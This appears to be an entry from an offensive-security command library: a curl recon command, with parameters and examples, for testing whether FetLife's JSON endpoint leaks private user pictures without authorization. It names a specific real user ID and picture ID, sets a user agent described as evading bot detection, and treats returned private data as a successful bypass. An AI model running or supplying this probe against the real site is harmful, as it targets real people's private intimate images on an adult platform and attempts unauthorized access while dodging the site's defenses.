---
id: 082534ad-940c-48da-b209-1671dc4c70e2
name: curl-test-fetlife-endpoint-json
type: command
executor: bash
data: >-
  curl https://fetlife.com/users/{user-id}/pictures/{pic-id} -H "Accept:
  application/json" --user-agent "not cur1"
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:27.448Z'
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - recon
  - http
  - fetlife
verified: false
validated: true
submitted: true
---

# curl-test-fetlife-endpoint-json

## Command

```bash
curl https://fetlife.com/users/{user-id}/pictures/{pic-id} -H "Accept: application/json" --user-agent "not cur1"
```

## Description

This command tests FetLife's endpoint for JSON response behavior, forcing application/json output to check for authorization bypass on private resources. Use it during reconnaissance to identify vulnerable formats.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL (https://fetlife.com/users/{user-id}/pictures/{pic-id}) | Target endpoint with user and resource IDs | Yes |
| -H "Accept: application/json" | Header to request JSON response | Yes |
| --user-agent "not cur1" | Custom UA to evade basic bot detection | No |

## Examples

### Basic Usage

```bash
curl https://fetlife.com/users/14104003/pictures/120041856 -H "Accept: application/json" --user-agent "not cur1"
```

### Advanced Usage

Add verbose output for debugging:

```bash
curl -v https://fetlife.com/users/{user-id}/pictures/{pic-id} -H "Accept: application/json" --user-agent "not cur1"
```

## Expected Output

JSON object with resource metadata (e.g., {"id":120041856, "url":"https://...", "privacy":"private"}), indicating bypass if private data is returned without auth error.

## Related

- [[commands/curl-fetlife-private-picture-json]]
- [[procedures/Test-FetLife-Endpoint-JSON-Behavior]]
